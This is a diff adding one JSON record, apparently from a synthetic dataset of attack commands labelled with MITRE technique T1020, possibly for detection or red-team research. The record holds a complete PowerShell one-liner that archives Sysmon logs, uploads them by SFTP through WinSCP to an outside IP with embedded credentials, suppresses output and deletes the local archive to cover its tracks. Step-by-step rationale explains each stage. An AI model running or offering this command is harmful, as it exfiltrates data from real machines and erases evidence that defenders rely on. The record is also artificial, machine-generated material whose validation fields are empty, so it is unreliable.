@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1020",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$zip=\"$env:TEMP\\sysmon_$((Get-Date).ToString('yyyyMMdd_HHmmss')).zip\"; Compress-Archive -Path 'C:\\ProgramData\\Sysmon\\*.log' -DestinationPath $zip -Force; $r=\"/incoming/$env:COMPUTERNAME/\"; & 'C:\\Program Files (x86)\\WinSCP\\WinSCP.com' /ini=nul /command 'option batch abort' 'option confirm off' 'open sftp://exfil:S3cr3t!@198.51.100.20/ -hostkey=\"ssh-ed25519 255 SHA256:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\"' (\"put `\"$zip`\" `\"$r`\" -nopermissions -preservetime -resume\") 'exit' | Out-Null; if($LASTEXITCODE -eq 0){ Remove-Item -Path $zip -Force -ErrorAction SilentlyContinue } 2>$null",
+  "explanation": "Archives Sysmon logs and exfiltrates the archive via SFTP using WinSCP with host key pinning and non-interactive batch options, then cleans up the local archive.",
+  "rationale_steps": [
+    "Package target data to a single archive to reduce transfer artifacts",
+    "Open a non-interactive SFTP session with host key pinning",
+    "Upload the archive with resume and preserved timestamps",
+    "Suppress console output and remove local artifacts on success"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1020-1f3f2541-f756b19b",
+  "source_prompt_hash": "1f3f2541",
+  "timestamp_utc": "2025-09-30T09:07:17.472275Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
